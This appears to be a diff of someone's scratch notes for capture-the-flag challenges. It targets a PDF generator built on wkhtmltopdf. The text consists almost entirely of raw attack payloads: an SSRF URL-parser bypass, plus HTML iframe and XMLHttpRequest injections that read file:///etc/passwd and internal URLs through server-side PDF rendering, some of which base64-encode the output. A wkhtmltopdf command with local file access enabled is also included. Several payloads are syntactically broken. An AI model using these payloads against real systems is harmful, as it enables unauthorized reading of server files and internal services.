@@ -127,7 +127,7 @@ Weak parser bypass
 GET /?url=google.com@0:1337/debug/environment
 
 PDFy:
-application/static/pdfs/
+/static/pdfs/
 0.12.5
 Qt 4.8.7
 https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536
@@ -192,3 +192,14 @@ form.addEventListener('submit', e => {
 <iframe src=http://94.237.58.148:37872/ width=1000 height=2000></iframe>
 <iframe src="file:///etc/passwd" width=1000 height=2000></iframe>
 <iframe src= width=1000 height=2000></iframe>
+<iframe src="x" onerror="document.write(window.location)" width=1000 height=2000></iframe>
+<iframe src="x" onerror="document.write(<script>x=new XMLHttpRequest;
+x.onload=function(){document.write(btoa(this.responseText))};
+x.open("GET","window.location");x.send();
+</script>)"width=1000 height=2000 ></iframe>
+<img src="x" onerror="document.write('test')" />
+<iframe src="x" onerror="document.write(<script>alert(/etc/passwd)</script>)" width=1000 height=2000></iframe>
+<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","http://94.237.53.3:52461///etc/passwd");x.send();</script>
+
+wkhtmltopdf --enable-local-file-access ext.html result.pdf
+<iframe src=http://10.10.16.125:80/result.pdf width=1000 height=2000></iframe>
